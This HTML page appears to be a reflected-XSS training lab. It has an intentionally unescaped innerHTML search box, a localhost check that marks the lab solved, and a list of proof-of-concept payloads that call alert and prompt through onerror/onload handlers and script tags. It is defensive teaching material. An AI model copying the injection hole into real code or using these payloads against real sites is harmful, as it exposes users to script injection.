<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title>xssLab1</title>

</head>
<script src="../config.js"></script>
<script>

    // import { backendUrl } from '../../env.js';
    var isSolved = false;
    const originalAlert = window.alert;
    const originalPrompt = window.prompt;
    window.alert = function (message) {
        originalAlert(message);
        console.log("alert");
        solveLab();
    }

    window.prompt = function (message) {
        originalPrompt(message);
        solveLab();
    }

    const search = () => {

        var inputValue = document.querySelector('.input-value').value;
        document.querySelector('.res-div').innerHTML = `You searched for <b>${inputValue}</b>`;
    }

    const solveLab = () => {
        console.log('lab solved');

        var labName = document.title;
        fetch(`https://localhost:7134/Users/solveLab`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ Name: "xssLab1" }),
            credentials: 'include'
        })
            .then(response => {
                if (!response.ok) {
                    if (response.status === 404) {
                        throw new Error('Not found');
                    } else if (response.status === 500) {
                        throw new Error('Server error');
                    } else {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                }
                return response.text();
            })
            .then(data => {
                console.log(data);
            })
            .catch(error => {
                console.error('There was a problem with the fetch operation: ' + error.message);
            });

        //window.location.reload();
    }

    function checkLab() {
        console.log("CheckLab function");
        var labName = document.title;
        fetch(`https://localhost:7134/Users/checkLab`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ Name: "xssLab1" }),
            credentials: 'include'
        })
            .then(response => {
                if (response.status === 401) {
                    window.location.href = '/login';
                    throw new Error('Unauthorized');
                }
                return response.text();
            })
            .then(data => {
                if (data === "LabIsCompleted") {
                    document.querySelector('.labIsCompleted').innerText = "Congratulations, you solved the lab!"
                    console.log("This lab have been solved");
                } else {
                    document.querySelector('.labIsCompleted').innerText = "Lab yet to be solved"
                    console.log("This lab have NOT been solved");
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }


</script>
<body onload="checkLab()">

    <h1>XSS Lab 1 </h1>
    <h2>Reflected XSS</h2>
    <div class="labIsCompleted">

    </div>
    <p>
        Reflected XXS happens when you can enter data to the website, such as using an input tag, and have what you entered written to the page.<br>
        For example, try to search for anything using the input below:<br>
        <input type="text" class="input-value" placeholder="Search" /><br>
        <button onclick="search()">Search</button><br>
        <div class="res-div">

        </div>
    </p>
    <br>
    <p>
        Being a clever Front-End Developer, you know what is going on, the app is QuerySelecting the value on the input and displaying it by setting it as the innerHTML of div tag<br>
        Althought this might be interesting, it is <b>dangerous</b> because it allows the user to insert HTML tags as a value and let's not forget that the script tag is, well, a tag.
        A bad intended user would be able to inject a script tag containing malicious Javascript<br>
        Modern browsers provide a vast layer of protection about common XSS attacks.<br>
        You might be familiar with injecting a script tag that simply evokes an alert() as a POC that the website is vulnerable to XXS.<br>
        Although in this page the developer haven't taken any measurements in order to avoid it, this kind of attack is deprecated for such modern broswers but there are still many ways in witch it can be attacked<br>
        Here is a list of possible payloads to be used in a XXS POC:<br>
        <br>

        &lt;img src/onerror=prompt(8)&gt;<br>
        &lt;image src =q onerror=prompt(8)&gt;<br>
        &lt;image src =q onerror=alert("hacked")&gt;<br>
        &lt;img src =q onerror=prompt(8)&gt;<br>
        &lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;<br>
        &lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;<br>
        &lt;svg onLoad svg onLoad="javascript:javascript:alert(1)"&gt;&lt;/svg onLoad&gt;<br>
        &lt;body onLoad body onLoad="javascript:javascript:alert(1)"&gt;&lt;/body onLoad&gt;<br>
        &lt;body onPageShow body onPageShow="javascript:javascript:alert(1)"&gt;&lt;/body onPageShow&gt;<br>            &lt;script&gt;javascript:alert(1)&lt;/script\x0D<br>
        &lt;image/src/onerror=prompt(8)&gt;<br>
        &lt;img/src/onerror=prompt(8)&gt;<br>
        &lt;image src/onerror=prompt(8)&gt;<br>

    </p>

    <div>
        <h3>Exercise </h3>
        Try to copy and paste any of those payloads into the input tag on the top of this page and see if any of them can execute JavaScript on the browser<br>
        If you get an alert() or prompt(), it proves that this app is vulnerable to XSS and you solve this lab!<br>
    </div>




</body>
</html>